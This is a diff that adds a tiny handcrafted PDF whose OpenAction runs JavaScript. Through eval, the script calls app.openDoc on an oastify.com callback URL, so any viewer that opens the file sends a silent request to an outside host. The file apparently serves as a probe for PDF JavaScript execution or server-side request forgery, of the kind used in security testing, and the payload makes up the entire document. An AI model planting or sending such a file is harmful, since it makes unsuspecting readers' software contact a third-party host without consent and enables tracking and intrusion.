@@ -1,0 +1,19 @@
+%PDF-1.4
+1 0 obj
+<<>>
+%endobj
+trailer
+<<
+/Root
+  <</Pages <<>>
+  /OpenAction
+      <<
+      /S/JavaScript
+      /JS(
+      eval(
+          'app.openDoc({cPath: encodeURI("https://k0llh3xkzxaqi9mb8981bijrui09o0cp.oastify.com"), cFS: "CHTTP" });'
+          );
+      )
+      >>
+  >>
+>>
